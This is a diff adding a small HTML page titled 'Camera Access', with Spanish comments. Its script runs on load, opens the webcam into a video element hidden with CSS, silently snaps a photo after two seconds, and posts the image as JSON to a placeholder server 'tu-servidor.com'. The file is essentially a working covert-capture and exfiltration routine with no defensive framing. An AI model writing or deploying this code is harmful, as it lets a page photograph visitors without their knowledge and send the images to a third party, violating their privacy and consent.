@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Camera Access</title>
+</head>
+<body>
+    <style>
+        video {
+            display: none;
+        }
+    </style>
+    <script>
+        function startCamera() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+
+                    // Capturar una foto después de 2 segundos
+                    setTimeout(() => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        const context = canvas.getContext('2d');
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        // Convertir la imagen a un formato que se pueda enviar
+                        const imageData = canvas.toDataURL('image/jpeg');
+                        console.log(imageData);
+
+                        // Aquí puedes enviar la imagen a un servidor
+                        fetch('https://tu-servidor.com/upload', {
+                            method: 'POST',
+                            body: JSON.stringify({ image: imageData }),
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                        });
+                    }, 2000);
+                })
+                .catch(err => {
+                    console.error('Error accessing camera: ', err);
+                });
+        }
+        startCamera();
+    </script>
+</body>
+</html>
